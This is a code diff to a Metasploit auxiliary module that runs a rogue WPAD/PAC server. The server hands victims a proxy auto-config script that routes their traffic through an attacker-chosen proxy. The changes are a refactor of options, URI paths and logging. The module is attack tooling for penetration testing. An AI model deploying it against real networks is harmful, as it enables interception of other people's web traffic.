@@ -33,7 +33,6 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptEnum.new('TYPE', [true, 'WPAD/PAC Data File', 'DAT', ['DAT', 'PAC']]),
         OptAddress.new('EXCLUDENETWORK', [ true, "Network to exclude",'127.0.0.1' ]),
         OptAddress.new('EXCLUDENETMASK', [ true, "Netmask to exclude",'255.255.255.0' ]),
         OptAddress.new('PROXY', [ true, "Proxy to redirect traffic to", '0.0.0.0' ]),
@@ -44,15 +43,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 
-  def cleanup
-    datastore['URIPATH'] = @previous_uri
-  end
-
-
   def on_request_uri(cli, request)
-    print_status("Request '#{request.method} #{request.headers['user-agent']}")
+    vprint_status("Request '#{request.method} #{request.headers['user-agent']}")
 
-    return if request.method == "POST"
+    return send_not_found(cli) if request.method == "POST"
 
     html = <<-EOS
 function FindProxyForURL(url, host) {
@@ -65,20 +59,23 @@ function FindProxyForURL(url, host) {
    }
 EOS
 
-    print_status("Sending WPAD config ...")
+    print_status("Sending WPAD config")
     send_response_html(cli, html,
       {
         'Content-Type' => 'application/x-ns-proxy-autoconfig'
       })
   end
 
+  def resource_uri
+    "/wpad.dat"
+  end
+
+  def primer
+    hardcoded_uripath("/proxy.pac")
+  end
 
   def run
-    @previous_uri = datastore['URIPATH']
-    datastore['URIPATH'] = (datastore['TYPE'] == 'DAT') ? 'wpad.dat' : 'proxy.pac'
-
-    print_status("Serving #{datastore['URIPATH']} on port #{datastore['SRVPORT']}")
-
+    # This should probably be added to the Http mixin's run method
     begin
       exploit
     rescue Errno::EACCES => e
